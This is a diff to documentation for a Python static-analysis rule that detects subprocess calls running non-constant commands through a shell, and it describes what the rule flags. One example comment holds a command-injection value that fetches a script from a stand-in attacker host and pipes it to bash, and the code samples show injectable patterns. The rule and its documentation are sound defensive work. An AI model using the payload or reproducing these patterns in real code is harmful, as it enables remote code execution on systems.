@@ -1,6 +1,6 @@
 ---
 title: "VNX-PY-007 – subprocess with shell=True"
-description: "Detect subprocess calls that use shell=True, which passes the command through the system shell and enables command injection when any part of the command string is user-controlled."
+description: "Detect subprocess calls that run a non-constant command line through the shell (shell=True, getoutput, create_subprocess_shell, or an explicit sh -c list), enabling command injection when any interpolated part is user-controlled."
 ---
 
 ## Overview
@@ -17,7 +17,9 @@ Developers use `shell=True` for convenience — it allows shell features like gl
 
 ## What Gets Flagged
 
-Any subprocess call with `shell=True` anywhere on the same line.
+A subprocess call (`call`, `run`, `Popen`, `check_call`, `check_output`, through the module, an alias or an imported name) with `shell=True` anywhere in the call, including a call broken over several lines, whose command is not a constant string; `subprocess.getoutput`/`getstatusoutput` and `asyncio.create_subprocess_shell` with a non-constant command; and a call whose argument list starts an explicit shell (`["sh", "-c", f"..."]`, `["cmd.exe", "/c", x]`, inline or appended to a list just above).
+
+Not flagged: a constant command (`subprocess.run("make clean", shell=True)`) or a variable assigned only constant strings above, argument lists without an explicit shell, `shell=False`, commands whose interpolations use `shlex.quote()`, other objects' `run` methods, and mentions in comments or strings.
 
 ```python
 # FLAGGED: user-controlled filename passed through shell
@@ -25,8 +27,14 @@ filename = request.args.get("file")
 subprocess.run(f"cat {filename}", shell=True)
 # Attacker sends file=foo; curl https://evil.example/shell | bash
 
-# FLAGGED: even with seemingly static input, shell=True is flagged
-subprocess.call("ls -la /tmp", shell=True)
+# FLAGGED: shell=True on its own line
+process = subprocess.Popen(
+    command,
+    shell=True,
+)
+
+# FLAGGED: an explicit shell in the list form
+subprocess.Popen(["sh", "-c", f"nslookup {host}"])
 
 # FLAGGED: Popen with shell=True
 proc = subprocess.Popen(f"convert {input_file} output.png", shell=True)
